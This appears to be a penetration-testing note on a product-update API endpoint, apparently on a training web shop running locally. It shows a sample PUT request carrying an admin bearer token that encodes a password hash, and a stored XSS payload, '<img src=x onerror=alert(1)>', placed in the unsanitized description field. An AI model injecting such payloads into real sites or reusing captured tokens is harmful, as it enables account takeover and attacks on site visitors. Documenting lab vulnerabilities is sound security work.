## Description

Update product listing details. 

## Connection Details

HTTP Methods: `PUT`
Parameters: 
- `name`
- `description`
- `price`
- `deluxePrice`
- `image`

### Sample Request

```http
PUT /api/Products/1 HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEyNy4wLjAuMSIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMi0yMCAwNDo1MzozMC43NzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0xMi0yMSAwMzowMDo1My4zMDUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjcxNjEwOTYyLCJleHAiOjE2NzE2Mjg5NjJ9.G80UEEzhy3kMP7kocJx4DRW7VzQthX51glVi_LO-CPeTT1QCvR_E2DAd8BmYOYRTCKlbVYRGWCrxf022Eerd1J5vP2l3AxYyL8arWzz-qdS7Eac5KlrdAJFDUPNetGFwLE7bs_BNjcpaB9DoxdJ5W8VHDGoZ2d6nXzK7aIdfMfo
DNT: 1
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
If-None-Match: W/"3251-XqeF5Ezp3FbGfhRB6wPG52X9jBM"
Content-Type: application/json
Content-Length: 50

{
"description":"<img src=x onerror=alert(1)>"
}
```

## Parameters 

### `description`
#### Description
Description of product. Value is not sanitized. 

## Vulnerabilities

### Stored one-click XSS 

#### Exploit
```json
{
"description":"<img src=x onerror=alert(1)>"
}
```

#### Impact
User that clicks on polluted product to view more details will trigger XSS. 

## Possible Attack Vectors

### ?


